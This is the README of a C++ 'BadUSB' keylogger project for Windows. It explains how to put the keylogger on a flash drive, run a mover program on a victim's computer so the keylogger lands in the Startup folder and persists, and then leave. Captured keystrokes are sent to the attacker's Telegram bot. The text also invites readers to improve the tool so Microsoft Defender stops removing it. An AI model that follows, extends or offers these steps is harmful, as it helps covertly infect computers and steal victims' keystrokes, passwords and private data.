# About the project
The BadUSB project is written in the C++ programming language. I used `libcurl` to send keys. Works only on `Windows`. The project has a problem, Microsoft Defender removes the keylogger itself, so it cannot be used for its intended purpose. But you can improve it.

# How is the project working?
First, we need to transfer the keylogger exe files (and libcurl dependencies) and move keylogger to a flash drive. To infect the computer with keylogger, we need to open the flash drive on the computer and run the `MoveKeylogger.exe` file. After that the program will automatically move the `Keylogger.exe` file to the Startup folder for automatic startup. After that we can take the flash drive away and leave.

# Project setup
Project customization means that you will open 2 separate projects (`Keylogger Source Code` and `Move Keylogger Source Code`) in Visual Studio. The `.sln` files are specified for this purpose.

In the `MoveKeylogger.cpp` file you can find such an empty point as `NAME_OF_KEYLOGGER_FILE`. Here you should enter the name of your exe file with keylogger (by standard `Keylogger.exe`). In `Main.cpp` file you can find `BOT_API` and `CHAT_ID`. Here you should enter the ID of your Telegram bot and the id of the chat with the same bot. For this purpose you will have to create a telegram bot, because the pressed keys will be sent there.
